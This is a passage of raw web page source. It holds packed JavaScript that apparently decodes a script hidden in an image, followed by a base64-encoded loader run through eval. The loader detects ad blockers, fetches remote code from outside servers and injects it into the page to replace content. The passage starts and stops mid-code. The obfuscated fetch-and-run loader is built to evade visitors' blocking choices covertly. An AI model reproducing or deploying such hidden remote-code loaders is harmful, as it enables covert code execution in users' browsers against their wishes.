d=0;d<a;d++)b+=c.S(n.z(n.J()*c.8));9 b};3 j=6(a,c){3 d=10;3 f=p;3 g=m.t(\'1I\');7(g.12){3 h=g.12(\'1H\');7(h.O)f=H}7(f){3 i=1G 1K();i.G(\'D\',\'1F:1J !11;1N:-1M !11;\');i.1L=\'1t\';m.X.I(i);i.19=6(){3 a=q.1D;3 b=q.1x;g.V=a;g.U=b;g.D.V=a+\'R\';g.D.U=b+\'R\';h.1w(q,0,0);3 d=h.O(0,0,a,b).1E;3 e=[];3 f=d.8;3 j=-1;r(3 k=0;k<f;k+=4)e[++j]=1u.1y(d[k]);3 l=e.13(\'\');7(c)c(l);m.X.B(i)};i.Z=6(){7(d>0){i.u=\'//\'+e(a,b);d--}};i.u=\'//\'+e(a,b);9 H}A 9 p};3 k=6(){j(c,6(a){3 b=m.t(\'Y\');b.14=\'17/16\';b.1z=a;m.s.I(b);m.s.B(b)})};d(a,6(){7(L.1C==p)d(L.1B,6(){7(L.1A==p)9;A k()});A k()})})();',62,112,'|||var|||function|if|length|return|||||||||||||document|Math|split|false|this|for|head|createElement|src|characterSet|encode|slice|62|floor|else|removeChild|hostname|style|push|readyState|setAttribute|true|appendChild|random|pad|window|png|pop|getImageData|pathname|ads|px|charAt|null|height|width|href|body|script|onerror||important|getContext|join|type|com|javascript|text|abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789|onload|indexOf|pow|decode|forEach|reverse|img|www|allkpop|js|path|pleaseletmeadvertise|onreadystatechange|loaded|getElementsByTagName|parseInt|location|undefined|complete|while|Anonymous|String|abcdefghijklmnopqrstuvwxyz|drawImage|naturalHeight|fromCharCode|innerHTML|_impspcabe_beta|_impspcabe_path|_impspcabe_alpha|naturalWidth|data|position|new|2d|canvas|absolute|Image|crossOrigin|10000px|left'.split('|'),0,{}));
</script>
<script>adonis.transport = 'https://www.aduoso.com/http';</script>
<script>/* loader-7.0.2 */eval(atob("IWZ1bmN0aW9uIGUodCxuLHIpe2Z1bmN0aW9uIG8oYSxjKXtpZighblthXSl7aWYoIXRbYV0pe3ZhciB1PSJmdW5jdGlvbiI9PXR5cGVvZiByZXF1aXJlJiZyZXF1aXJlO2lmKCFjJiZ1KXJldHVybiB1KGEsITApO2lmKGkpcmV0dXJuIGkoYSwhMCk7dmFyIHM9bmV3IEVycm9yKCJDYW5ub3QgZmluZCBtb2R1bGUgJyIrYSsiJyIpO3Rocm93IHMuY29kZT0iTU9EVUxFX05PVF9GT1VORCIsc312YXIgbD1uW2FdPXtleHBvcnRzOnt9fTt0W2FdWzBdLmNhbGwobC5leHBvcnRzLGZ1bmN0aW9uKGUpe3ZhciBuPXRbYV1bMV1bZV07cmV0dXJuIG8obj9uOmUpfSxsLGwuZXhwb3J0cyxlLHQsbixyKX1yZXR1cm4gblthXS5leHBvcnRzfWZvcih2YXIgaT0iZnVuY3Rpb24iPT10eXBlb2YgcmVxdWlyZSYmcmVxdWlyZSxhPTA7YTxyLmxlbmd0aDthKyspbyhyW2FdKTtyZXR1cm4gb30oezE6W2Z1bmN0aW9uKGUsdCxuKXsidXNlIHN0cmljdCI7dmFyIHI9ZSgxMiksbz1lKDcpO2UoMjIpLHdpbmRvdy5hZG9uaXNDb25uVHlwZT0iaHR0cCIsci5sb2dnZXIuaW5mbygiW2h0dHBMb2FkZXJdOiBTdGFydGluZyBib290c3RyYXAiKSwoMCxvLnJ1bikoKX0sezEyOjEyLDIyOjIyLDc6N31dLDI6W2Z1bmN0aW9uKGUsdCxuKXsidXNlIHN0cmljdCI7ZnVuY3Rpb24gcigpe3JldHVybiBpKHdpbmRvdykmJmMod2luZG93KSYmdSh3aW5kb3cpJiZhKHdpbmRvdykmJnMod2luZG93KX1mdW5jdGlvbiBvKCl7cmV0dXJuIGkod2luZG93KSYmdSh3aW5kb3cpJiZhKHdpbmRvdykmJnMod2luZG93KX1mdW5jdGlvbiBpKGUpe3ZhciB0PSJfX3h5el9fIjt0cnl7cmV0dXJuIGUubG9jYWxTdG9yYWdlLnNldEl0ZW0odCx0KSxlLmxvY2FsU3RvcmFnZS5yZW1vdmVJdGVtKHQpLCEwfWNhdGNoKG4pe3JldHVybiExfX1mdW5jdGlvbiBhKGUpe3RyeXtyZXR1cm4hIW5ldyBlLkJsb2J9Y2F0Y2godCl7cmV0dXJuITF9fWZ1bmN0aW9uIGMoZSl7dmFyIHQ9ZnVuY3Rpb24odCl7cmV0dXJuIHQuc29tZShmdW5jdGlvbih0KXtyZXR1cm4gdCBpbiBlfSl9LG49WyJSVENQZWVyQ29ubmVjdGlvbiIsIm1velJUQ1BlZXJDb25uZWN0aW9uIiwid2Via2l0UlRDUGVlckNvbm5lY3Rpb24iXSxyPVsiUlRDU2Vzc2lvbkRlc2NyaXB0aW9uIiwibW96UlRDU2Vzc2lvbkRlc2NyaXB0aW9uIiwid2Via2l0UlRDU2Vzc2lvbkRlc2NyaXB0aW9uIl0sbz1bIlJUQ0ljZUNhbmRpZGF0ZSIsIm1velJUQ0ljZUNhbmRpZGF0ZSIsIndlYmtpdFJUQ0ljZUNhbmRpZGF0ZSJdO3JldHVybiB0KG4pJiZ0KHIpJiZ0KG8pfWZ1bmN0aW9uIHUoZSl7cmV0dXJuIlByb21pc2UiaW4gZSYmInJlc29sdmUiaW4gZS5Qcm9taXNlJiYicmVqZWN0ImluIGUuUHJvbWlzZSYmImFsbCJpbiBlLlByb21pc2UmJiJyYWNlImluIGUuUHJvbWlzZX1mdW5jdGlvbiBzKGUpe3JldHVybiJmdW5jdGlvbiI9PXR5cGVvZiBlLk9iamVjdC5hc3NpZ259dC5leHBvcnRzPXtpc1N1cHBvcnRlZEJyb3dzZXJSdGM6cixpc1N1cHBvcnRlZEJyb3dzZXI6byxpc0xvY2FsU3RvcmFnZVN1cHBvcnRlZDppLGlzUnRjU3VwcG9ydGVkOmMsaXNCbG9iU3VwcG9ydGVkOmEsaXNPYmplY3RBc3NpZ25TdXBwb3J0ZWQ6cyxpc1Byb21pc2VTdXBwb3J0ZWQ6dX19LHt9XSwzOltmdW5jdGlvbihlLHQsbil7InVzZSBzdHJpY3QiO2Z1bmN0aW9uIHIoZSx0KXt2YXIgbj0iY2FjaGUvc3RvcmVBZG9uaXNDbGllbnRSZXNwb25zZSIscj10WyJhZG9uaXMtY2xpZW50LXZlcnNpb24iXSxhPXRbImNhY2hlLWNvbnRyb2wiXSxjPWEmJmEuc3RhcnRzV2l0aCgibWF4LWFnZSIpLHU9dC5leHBpcnlNaWxsaXN8fDA7aWYoYyl7aS5sb2dnZXIuZGVidWcoYSk7dmFyIHM9cGFyc2VJbnQoYS5zcGxpdCgiPSIpWzFdLDEwKTtpc05hTihzKXx8KHU9KG5ldyBEYXRlKS5nZXRUaW1lKCkrMWUzKnMpfXImJihpLmxvZ2dlci5pbmZvKCJbIituKyJdOiBuZXcgZXhwaXJ5ICIrdSsiID0gIituZXcgRGF0ZSh1KSksbyhlLHIsdSkpfWZ1bmN0aW9uIG8oZSx0LG4pe3dpbmRvdy5sb2NhbFN0b3JhZ2UuYWRvbmlzQ2FjaGVTcmM9ZSx3aW5kb3cubG9jYWxTdG9yYWdlLmFkb25pc0NhY2hlRXhwaXJ5TWlsbGlzPW4sd2luZG93LmxvY2FsU3RvcmFnZS5hZG9uaXNDbGllbnRWZXJzaW9uPXR9T2JqZWN0LmRlZmluZVByb3BlcnR5KG4sIl9fZXNNb2R1bGUiLHt2YWx1ZTohMH0pLG4uc3RvcmVBZG9uaXNDbGllbnRSZXNwb25zZT1yLG4uY2FjaGVBZG9uaXNDbGllbnQ9bzt2YXIgaT1lKDEyKX0sezEyOjEyfV0sNDpbZnVuY3Rpb24oZSx0LG4peyJ1c2Ugc3RyaWN0Ijt2YXIgcj1lKDUpO3dpbmRvdy5hZG9uaXNIYXNoPXdpbmRvdy5hZG9uaXNIYXNofHx3aW5kb3cubG9jYXRpb24uaGFzaHx8IiI7dmFyIG89d2luZG93LmFkb25pc0hhc2guaW5kZXhPZigiYWRvbmlzLWxvZ2dpbmciKT49MDtyLkxPR19MRVZFTD1vPyJkZWJ1ZyI6ci5MT0dfTEVWRUw7dmFyIGk9d2luZG93LmFkb25pc3x8e307aS53c0hvc3QmJnIuV1MmJihyLldTLmhvc3Q9aS53c0hvc3QpLGkudHJhbnNwb3J0JiZyLlNVRVpfSFRUUF9FTkRQT0lOVCYmKHIuU1VFWl9IVFRQX0VORFBPSU5UPWkudHJhbnNwb3J0KSx0LmV4cG9ydHM9cn0sezU6NX1dLDU6W2Z1bmN0aW9uKGUsdCxuKXsidXNlIHN0cmljdCI7dC5leHBvcnRzPXtSRUFMX1NUVU5fSE9TVDoic3R1bi54cGFuYW1hLm5ldDozNDc4IixUVVJOU0lHTkFMX0hPU1Q6InRzLnAueHBhbmFtYS5uZXQ6NzAwMCIsU1RVTkdVTl9IT1NUOiJzZy5wLnhwYW5hbWEubmV0OjM0ODAiLFNFUlZFUl9DQU5ESURBVEU6ImNhbmRpZGF0ZTo4Mjc2NDgwMjYgMSB1ZHAgMjEyMjE5NDY4NyBTRVJWRVJfSVAgU0VSVkVSX1BPUlQgdHlwIGhvc3QgZ2VuZXJhdGlvbiAwIixSRVBPUlRJTkdfVVJMOiJodHRwczovL2xiLnN0YXRzZXZlbnQuY29tL3N0YXRzIixSRVBPUlRJTkdfUkFURTouMDEsTE9HX0xFVkVMOiJlcnJvciIsUkVQT1JUX0VSUk9SUzohMCxNQU5JRkVTVF9VUkw6Imh0dHBzOi8vc3JpLmpzaW50ZWdyaXR5LmNvbS9tYW5pZmVzdC5qc29uIixNQU5JRkVTVF9FWFBJUkFUSU9OX1RJTUU6ODY0MDAsQURfTUFSS0VSOiJhZG9uaXMtbWFya2VyIixBRE9OSVNfQ0xJRU5UX0ZFVENIX1VSTDoiaHR0cHM6Ly9hZHNlcnZlci54cGFuYW1hLm5ldC9jbGllbnQtNy1sYXRlc3QuanMiLFdTOntob3N0OiJzdWV6LXNlcnZlci54cGFuYW1hLm5ldCIscGF0aDoiL3dzIixwb3J0OjQ0MyxzZWN1cmU6ITAscHJvbWlzZVRpbWVvdXQ6M2UzfSxTRVJWSUNFX1NUQVRVU19VUkw6ZnVuY3Rpb24oZSl7cmV0dXJuImh0dHBzOi8vY2xpZW50LnJlYWN0cmpzLmNvbS8iK2UrIi1zdGF0dXMuanNvbiJ9LFNVRVpfSFRUUF9FTkRQT0lOVDoiaHR0cHM6Ly9zdWV6LnhwYW5hbWEubmV0L2h0dHAiLFNVRVpfSFRUUF9SRVRSWTozLFNVRVpfSFRUUF9ERUxBWToxMDB9fSx7fV0sNjpbZnVuY3Rpb24oZSx0LG4peyJ1c2Ugc3RyaWN0IjtmdW5jdGlvbiByKGUpe3JldHVybiBlJiZlLl9fZXNNb2R1bGU/ZTp7ImRlZmF1bHQiOmV9fWZ1bmN0aW9uIG8oKXt2YXIgZT0iY29udHJvbC1zZXJ2ZXIvY2hlY2siO2YubG9nZ2VyLmluZm8oIlsiK2UrIl06IENoZWNraW5nIHNlcnZpY2Ugc3RhdHVzIik7dmFyIHQ9aSh3aW5kb3cpO3JldHVybigwLHUucmVxdWVzdCkodCkudGhlbihmdW5jdGlvbih0KXtyZXR1cm4gZi5sb2dnZXIuZGVidWcoIlsiK2UrIl06IFN0YXR1cyBjaGVjayBmZXRjaGVkIHdpdGggc3RhdHVzLWNvZGUgPCIrdC5zdGF0dXMrIj4iKSxKU09OLnBhcnNlKHQucmVzcG9uc2VUZXh0KX0pWyJjYXRjaCJdKGZ1bmN0aW9uKHQpe2YubG9nZ2VyLmluZm8oIlsiK2UrIl06IEZhaWxlZCB0byBjaGVjayBjb250cm9sIHNlcnZlciBzdGF0dXMgPCIrdCsiPiIpO3ZhciBuPXZvaWQgMCE9PXQucmVxP3QucmVxLnN0YXR1czpudWxsO3Rocm93IDA9PT1uP25ldyBzLlhockJsb2NrRXJyb3I6bmV3IEVycm9yKCJVbmV4cGVjdGVkIHN0YXR1cyBjb2RlIHdoaWxlIHBlcmZvcm1pbmcgY29udHJvbCBzZXJ2ZXIgY2hlY2ssIHN0YXR1cy1jb2RlID0gPCIrbisiPiIpfSl9ZnVuY3Rpb24gaShlKXtyZXR1cm4gZFsiZGVmYXVsdCJdLlNFUlZJQ0VfU1RBVFVTX1VSTChjWyJkZWZhdWx0Il0uZ2V0KGUubG9jYXRpb24uaG9zdCkpfU9iamVjdC5kZWZpbmVQcm9wZXJ0eShuLCJfX2VzTW9kdWxlIix7dmFsdWU6ITB9KSxuLmNoZWNrPW8sbi5nZXRTZXJ2aWNlU3RhdHVzVXJsPWk7dmFyIGE9ZSgyNCksYz1yKGEpLHU9ZSgxOCkscz1lKDkpLGw9ZSg0KSxkPXIobCksZj1lKDEyKX0sezEyOjEyLDE4OjE4LDI0OjI0LDQ6NCw5Ojl9XSw3OltmdW5jdGlvbihlLHQsbil7InVzZSBzdHJpY3QiO2Z1bmN0aW9uIHIoZSl7aWYoZSYmZS5fX2VzTW9kdWxlKXJldHVybiBlO3ZhciB0PXt9O2lmKG51bGwhPWUpZm9yKHZhciBuIGluIGUpT2JqZWN0LnByb3RvdHlwZS5oYXNPd25Qcm9wZXJ0eS5jYWxsKGUsbikmJih0W25dPWVbbl0pO3JldHVybiB0WyJkZWZhdWx0Il09ZSx0fWZ1bmN0aW9uIG8oZSl7cmV0dXJuIGUmJmUuX19lc01vZHVsZT9lOnsiZGVmYXVsdCI6ZX19ZnVuY3Rpb24gaSgpe3ZhciBlPSJodHRwLWFkb25pcy1jbGllbnQtbG9hZGVyL3J1biI7cmV0dXJuIHBbImRlZmF1bHQiXS5yZXBvcnRFdmVudCgiYm9vdHN0cmFwLmh0dHAucGFnZXZpZXciKSxnWyJkZWZhdWx0Il0uaXNTdXBwb3J0ZWRCcm93c2VyKCk/KHkubG9nZ2VyLmluZm8oIlsiK2UrIl06IEJyb3dzZXIgaXMgY29tcGF0aWJsZSIpLHBbImRlZmF1bHQiXS5yZXBvcnRFdmVudCgiYm9vdHN0cmFwLmh0dHAuc3VwcG9ydGVkIiksYSgpLnRoZW4oZnVuY3Rpb24odCl7cmV0dXJuIHkubG9nZ2VyLmluZm8oIlsiK2UrIl06IFJ1bm5pbmcgYW5kIGNhY2hpbmcgYWRvbmlzQ2xpZW50IHNvdXJjZSIpLHBbImRlZmF1bHQiXS5yZXBvcnRFdmVudCgiYm9vdHN0cmFwLmh0dHAucnVuY2xpZW50c2NyaXB0IikscFsiZGVmYXVsdCJdLnNhdmVUaW1pbmcoKSxkWyJkZWZhdWx0Il0uZGVmaW5lUmVhZE9ubHlQcm9wZXJ0eSgiYWRvbmlzQ29uZmlnIixzWyJkZWZhdWx0Il0pLCgwLG0uc3RvcmVBZG9uaXNDbGllbnRSZXNwb25zZSkodC5zb3VyY2UsdC5tZXRhKSx2WyJkZWZhdWx0Il0uaW5zZXJ0SW5saW5lU2NyaXB0KHQuc291cmNlKSxudWxsfSlbImNhdGNoIl0oZnVuY3Rpb24odCl7cmV0dXJuIHQgaW5zdGFuY2VvZiBMLlhockJsb2NrRXJyb3I/KHkubG9nZ2VyLmluZm8oIlsiK2UrIl06IEZhaWxlZCB0byBmZXRjaCBhZG9uaXMtY2xpZW50IHVzaW5nIFN1ZXoiKSx5LmxvZ2dlci5pbmZvKCJbIitlKyJdOiBBbGwgbG9hZGVycyBmYWlsZWQgdG8gZmV0Y2ggYWRvbmlzLWNsaWVudCwgY2hlY2tpbmcgY29udHJvbCBzZXJ2ZXIiKSxiLmNoZWNrKCkpOih5LmxvZ2dlci53YXJuKCJbIitlKyJdOiBVbmV4cGVjdGVkIGVycm9yIHdoZW4gdHJ5aW5nIHRvIGZldGNoIGFkb25pcy1jbGllbnQgb3ZlciBTdWV6OiA8Iit0KyI+IikscFsiZGVmYXVsdCJdLnJlcG9ydEVycm9yKHQpLG51bGwpfSlbImNhdGNoIl0oZnVuY3Rpb24odCl7cmV0dXJuIHQgaW5zdGFuY2VvZiBMLlhockJsb2NrRXJyb3I/KHBbImRlZmF1bHQiXS5yZXBvcnRFdmVudCgiYm9vdHN0cmFwLmh0dHAuc3RhdHVzX2Jsb2NrZWQiKSx5LmxvZ2dlci5pbmZvKCJbIitlKyJdOiBDb250cm9sIHNlcnZlciBjaGVjayBmYWlsZWQsIHByb2JhYmx5IGFuIGFkYmxvY2tlciIpLHtzdGF0dXM6ITB9KTooeS5sb2dnZXIud2FybigiWyIrZSsiXTogVW5leHBlY3RlZCBlcnJvciBmcm9tIGNvbnRyb2wgc2VydmVyIGNoZWNrOiA8Iit0KyI+IikscFsiZGVmYXVsdCJdLnJlcG9ydEVycm9yKHQpLG51bGwpfSkudGhlbihmdW5jdGlvbih0KXsoMCxTWyJkZWZhdWx0Il0pKHdpbmRvdy5uYXZpZ2F0b3IudXNlckFnZW50KSYmdCYmInN0YXR1cyJpbiB0JiZ0LnN0YXR1cz8ocFsiZGVmYXVsdCJdLnJlcG9ydEV2ZW50KCJib290c3RyYXAuaHR0cC50cmlnZ2VkIikseS5sb2dnZXIuaW5mbygiWyIrZSsiXTogQ29udHJvbCBzZXJ2ZXIgcmVwb3J0ZWQgc3RhdHVzIGlzIGhlYWx0aHkgb3Igd2FzIGJsb2NrZWQsIHRyaWdnZXJpbmcgb3BwZW5oZWltZXIiKSwoMCxjLnJlcGxhY2VDb250ZW50KSh3aW5kb3cuZG9jdW1lbnQpKTp0JiYic3RhdHVzImluIHQmJnQuc3RhdHVzPT09ITEmJihwWyJkZWZhdWx0Il0ucmVwb3J0RXZlbnQoImJvb3RzdHJhcC5odHRwLm5vdF90cmlnZ2VkIikseS5sb2dnZXIud2FybigiWyIrZSsiXTogQ29udHJvbCBzZXJ2ZXIgcmVwb3J0ZWQgc3RhdHVzIGlzIHVuaGVhbHRoeSwgbm90IHRyaWdnZXJpbmcgb3BwZW5oZWltZXIiKSl9KSk6dm9pZCB5LmxvZ2dlci5pbmZvKCJbIitlKyJdOiBJbmNvbXBhdGlibGUgYnJvd3Nlciwgbm90IGNvbnRpbnVpbmciKX1mdW5jdGlvbiBhKCl7dmFyIGU9Imh0dHAtYWRvbmlzLWNsaWVudC1sb2FkZXIvbG9hZEFkb25pc0NsaWVudCI7cmV0dXJuIHkubG9nZ2VyLmRlYnVnKCJbIitlKyJdOiBUcnlpbmcgdG8gbG9hZCBhZG9uaXMtY2xpZW50IHdpdGggWEhSIGxvYWRlciAoZnJvbSBDRE4pIiksVC5sb2FkKClbImNhdGNoIl0oZnVuY3Rpb24odCl7cmV0dXJuIHQgaW5zdGFuY2VvZiBMLlhockJsb2NrRXJyb3I/eS5sb2dnZXIuaW5mbygiWyIrZSsiXTogRmFpbGVkIHRvIGZldGNoIGFkb25pcy1jbGllbnQgb3ZlciBYSFIsIHRyeWluZyB0byBsb2FkIGZyb20gY2FjaGUiKTooeS5sb2dnZXIud2FybigiWyIrZSsiXTogVW5leHBlY3RlZCBlcnJvciB3aGVuIHRyeWluZyBmZXRjaCBhZG9uaXMtY2xpZW50IG92ZXIgWEhSLCB0cnlpbmcgdG8gbG9hZCBmcm9tIGNhY2hlOiA8Iit0KyI+IikscFsiZGVmYXVsdCJdLnJlcG9ydEVycm9yKHQpKSxQLmxvYWQoKX0pWyJjYXRjaCJdKGZ1bmN0aW9uKHQpe3JldHVybiB0IGluc3RhbmNlb2YgTC5DYWNoZUxvYWRFcnJvcj95LmxvZ2dlci5pbmZvKCJbIitlKyJdOiBGYWlsZWQgdG8gZmV0Y2ggYWRvbmlzLWNsaWVudCBmcm9tIGNhY2hlLCB0cnlpbmcgdG8gbG9hZCBmcm9tIFN1ZXoiKTooeS5sb2dnZXIud2FybigiWyIrZSsiXTogVW5leHBlY3RlZCBlcnJvciB3aGVuIHRyeWluZyBmZXRjaCBhZG9uaXMtY2xpZW50IGZyb20gY2FjaGUsIHRyeWluZyB0byBsb2FkIGZyb20gU3VlejogPCIrdCsiPiIpLHBbImRlZmF1bHQiXS5yZXBvcnRFcnJvcih0KSksQy5sb2FkKCl9KX1PYmplY3QuZGVmaW5lUHJvcGVydHkobiwiX19lc01vZHVsZSIse3ZhbHVlOiEwfSksbi5ydW49aSxuLmxvYWRBZG9uaXNDbGllbnQ9YTt2YXIgYz1lKDIwKSx1PWUoNCkscz1vKHUpLGw9ZSgxNyksZD1vKGwpLGY9ZSgxNSkscD1vKGYpLGg9ZSgyKSxnPW8oaCksdz1lKDE0KSx2PW8odyksXz1lKDYpLGI9cihfKSxtPWUoMykseT1lKDEyKSxFPWUoMTYpLFM9byhFKSxPPWUoMTEpLFQ9cihPKSxSPWUoMTApLEM9cihSKSxBPWUoOCksUD1yKEEpLEw9ZSg5KX0sezEwOjEwLDExOjExLDEyOjEyLDE0OjE0LDE1OjE1LDE2OjE2LDE3OjE3LDI6MiwyMDoyMCwzOjMsNDo0LDY6Niw4OjgsOTo5fV0sODpbZnVuY3Rpb24oZSx0LG4peyJ1c2Ugc3RyaWN0IjtmdW5jdGlvbiByKCl7dmFyIGU9ImxvYWRlcnMvY2FjaGUvbG9hZCI7YS5sb2dnZXIuZGVidWcoIlsiK2UrIl06IFN0YXJ0aW5nIGNhY2hlIGxvYWRlciIpLHdpbmRvdy5sb2NhbFN0b3JhZ2UuYWRvbmlzQ2FjaGVFeHBpcnkmJndpbmRvdy5sb2NhbFN0b3JhZ2UucmVtb3ZlSXRlbSgiYWRvbmlzQ2FjaGVFeHBpcnkiKTt2YXIgdD1wYXJzZUludCh3aW5kb3cubG9jYWxTdG9yYWdlLmFkb25pc0NhY2hlRXhwaXJ5TWlsbGlzLDEwKTtpc05hTih0KSYmKHQ9MCk7dmFyIG49d2luZG93LmxvY2FsU3RvcmFnZS5hZG9uaXNDbGllbnRWZXJzaW9uLHI9d2luZG93LmxvY2FsU3RvcmFnZS5hZG9uaXNDYWNoZVNyYyxvPShuZXcgRGF0ZSkuZ2V0VGltZSgpPj10LGM9eyJhZG9uaXMtY2xpZW50LXZlcnNpb24iOm4sZXhwaXJ5TWlsbGlzOnQsY2FjaGVkU291cmNlOnJ9O3JldHVybiByP28/KGEubG9nZ2VyLmRlYnVnKCJbIitlKyJdOiBDYWNoZWQgdmVyc2lvbiBvZiBhZG9uaXMtY2xpZW50IGlzIGV4cGlyZWQiKSxQcm9taXNlLnJlamVjdChuZXcgaS5DYWNoZUxvYWRFcnJvcihudWxsLGMpKSk6KGEubG9nZ2VyLmRlYnVnKCJbIitlKyJdOiBGb3VuZCBhIHZhbGlkIGNhY2hlZCB2ZXJzaW9uIG9mIGFkb25pcy1jbGllbnQiKSxQcm9taXNlLnJlc29sdmUoe3NvdXJjZTpyLG1ldGE6Y30pKTooYS5sb2dnZXIuZGVidWcoIlsiK2UrIl06IE5vIGNhY2hlZCB2ZXJzaW9uIG9mIGFkb25pcy1jbGllbnQgZm91bmQgaW4gdGhlIGxvY2FsU3RvcmFnZSIpLFByb21pc2UucmVqZWN0KG5ldyBpLkNhY2hlTG9hZEVycm9yKG51bGwsYykpKX1mdW5jdGlvbiBvKCl7cmV0dXJuIHIoKVsiY2F0Y2giXShmdW5jdGlvbihlKXtpZihlIGluc3RhbmNlb2YgaS5DYWNoZUxvYWRFcnJvcilyZXR1cm57c291cmNlOmUuc291cmNlLG1ldGE6ZS5tZXRhfX0pfU9iamVjdC5kZWZpbmVQcm9wZXJ0eShuLCJfX2VzTW9kdWxlIix7dmFsdWU6ITB9KSxuLmxvYWQ9cixuLmxvYWRJZ25vcmluZ0Vycm9ycz1vO3ZhciBpPWUoOSksYT1lKDEyKX0sezEyOjEyLDk6OX1dLDk6W2Z1bmN0aW9uKGUsdCxuKXsidXNlIHN0cmljdCI7ZnVuY3Rpb24gcihlKXtyZXR1cm4gZSYmZS5fX2VzTW9kdWxlP2U6eyJkZWZhdWx0IjplfX1mdW5jdGlvbiBvKGUsdCl7aWYoIShlIGluc3RhbmNlb2YgdCkpdGhyb3cgbmV3IFR5cGVFcnJvcigiQ2Fubm90IGNhbGwgYSBjbGFzcyBhcyBhIGZ1bmN0aW9uIil9ZnVuY3Rpb24gaShlLHQpe2lmKCFlKXRocm93IG5ldyBSZWZlcmVuY2VFcnJvcigidGhpcyBoYXNuJ3QgYmVlbiBpbml0aWFsaXNlZCAtIHN1cGVyKCkgaGFzbid0IGJlZW4gY2FsbGVkIik7cmV0dXJuIXR8fCJvYmplY3QiIT10eXBlb2YgdCYmImZ1bmN0aW9uIiE9dHlwZW9mIHQ/ZTp0fWZ1bmN0aW9uIGEoZSx0KXtpZigiZnVuY3Rpb24iIT10eXBlb2YgdCYmbnVsbCE9PXQpdGhyb3cgbmV3IFR5cGVFcnJvcigiU3VwZXIgZXhwcmVzc2lvbiBtdXN0IGVpdGhlciBiZSBudWxsIG9yIGEgZnVuY3Rpb24sIG5vdCAiK3R5cGVvZiB0KTtlLnByb3RvdHlwZT1PYmplY3QuY3JlYXRlKHQmJnQucHJvdG90eXBlLHtjb25zdHJ1Y3Rvcjp7dmFsdWU6ZSxlbnVtZXJhYmxlOiExLHdyaXRhYmxlOiEwLGNvbmZpZ3VyYWJsZTohMH19KSx0JiYoT2JqZWN0LnNldFByb3RvdHlwZU9mP09iamVjdC5zZXRQcm90b3R5cGVPZihlLHQpOmUuX19wcm90b19fPXQpfU9iamVjdC5kZWZpbmVQcm9wZXJ0eShuLCJfX2VzTW9kdWxlIix7dmFsdWU6ITB9KSxuLkNhY2hlTG9hZEVycm9yPW4uV3NCbG9ja0Vycm9yPW4uWGhyQmxvY2tFcnJvcj12b2lkIDA7dmFyIGM9ZSgxOSksdT1yKGMpO24uWGhyQmxvY2tFcnJvcj1mdW5jdGlvbihlKXtmdW5jdGlvbiB0KCl7cmV0dXJuIG8odGhpcyx0KSxpKHRoaXMsKHQuX19wcm90b19ffHxPYmplY3QuZ2V0UHJvdG90eXBlT2YodCkpLmFwcGx5KHRoaXMsYXJndW1lbnRzKSl9cmV0dXJuIGEodCxlKSx0fSh1WyJkZWZhdWx0Il0pLG4uV3NCbG9ja0Vycm9yPWZ1bmN0aW9uKGUpe2Z1bmN0aW9uIHQoKXtyZXR1cm4gbyh0aGlzLHQpLGkodGhpcywodC5fX3Byb3RvX198fE9iamVjdC5nZXRQcm90b3R5cGVPZih0KSkuYXBwbHkodGhpcyxhcmd1bWVudHMpKX1yZXR1cm4gYSh0LGUpLHR9KHVbImRlZmF1bHQiXSksbi5DYWNoZUxvYWRFcnJvcj1mdW5jdGlvbihlKXtmdW5jdGlvbiB0KGUsbil7byh0aGlzLHQpO3ZhciByPWkodGhpcywodC5fX3Byb3RvX198fE9iamVjdC5nZXRQcm90b3R5cGVPZih0KSkuY2FsbCh0aGlzKSk7cmV0dXJuIHIuc291cmNlPWUsci5tZXRhPW4scn1yZXR1cm4gYSh0LGUpLHR9KHVbImRlZmF1bHQiXSl9LHsxOToxOX1dLDEwOltmdW5jdGlvbihlLHQsbil7InVzZSBzdHJpY3QiO2Z1bmN0aW9uIHIoZSl7cmV0dXJuIGUmJmUuX19lc01vZHVsZT9lOnsiZGVmYXVsdCI6ZX19ZnVuY3Rpb24gbygpe3ZhciBlPSJsb2FkZXJzL3N1ZXotaHR0cCI7ZC5sb2dnZXIuZGVidWcoIlsiK2UrIl06IFN0YXJ0aW5nIFN1ZXogSFRUUCBsb2FkZXIiKTt2YXIgdD1KU09OLnN0cmluZ2lmeSh7aG9zdDoiYXNzZXRzIixwYXRoOiJjbGllbnQiLHBhcmFtczp7fSxoZWFkZXJzOnthZG9uaXNfY2xpZW50X2FwaToiNy4wLjAifX0pO3JldHVybigwLGwucmVxdWVzdCkoY1siZGVmYXVsdCJdLlNVRVpfSFRUUF9FTkRQT0lOVCwiUE9TVCIsdCkudGhlbihmdW5jdGlvbih0KXtkLmxvZ2dlci5kZWJ1ZygiWyIrZSsiXTogU3VjY2Vzc2Z1bGx5IGZldGNoZWQgYWRvbmlzLWNsaWVudCBvdmVyIFhIUiIpO3ZhciBuPXt9O3RyeXtuWyJhZG9uaXMtY2xpZW50LXZlcnNpb24iXT10LmdldFJlc3BvbnNlSGVhZGVyKCJhZG9uaXMtY2xpZW50LXZlcnNpb24iKX1jYXRjaChyKXt9dHJ5e25bImNhY2hlLWNvbnRyb2wiXT10LmdldFJlc3BvbnNlSGVhZGVyKCJjYWNoZS1jb250cm9sIil9Y2F0Y2gocil7fXJldHVybntzb3VyY2U6dC5yZXNwb25zZVRleHQsbWV0YTpufX0pWyJjYXRjaCJdKGZ1bmN0aW9uKHQpe3Rocm93IGQubG9nZ2VyLmRlYnVnKCJbIitlKyJdOiBGYWlsZWQgdG8gZmV0Y2ggYWRvbmlzLWNsaWVudCBmcm9tIFN1ZXogb3ZlciBYSFIgPCIrdCsiPiIpLDA9PT10LnJlcS5zdGF0dXM/bmV3IGYuWGhyQmxvY2tFcnJvcjpuZXcgRXJyb3IoIlVuZXhwZWN0ZWQgZXJyb3IgZmV0Y2hpbiBhZG9uaXMtY2xpZW50LCBzdGF0dXMtY29kZSA9IDwiK3QucmVxLnN0YXR1cysiPiIpfSl9ZnVuY3Rpb24gaSgpe3ZhciBlPWNbImRlZmF1bHQiXS5TVUVaX0hUVFBfUkVUUll8fDEsdD1jWyJkZWZhdWx0Il0uU1VFWl9IVFRQX0RFTEFZfHwwLG49QXJyYXkuYXBwbHkoMCxBcnJheShlKSkubWFwKGZ1bmN0aW9uKGUpe3JldHVybiBvfSk7cmV0dXJuIHNbImRlZmF1bHQiXS5yZXBvcnRFdmVudCgiYm9vdHN0cmFwLmh0dHAuc3Vlel9vcGVuaW5nIiksKDAscC5jaGFpbikobix0KS50aGVuKGZ1bmN0aW9uKGUpe3JldHVybiBzWyJkZWZhdWx0Il0ucmVwb3J0RXZlb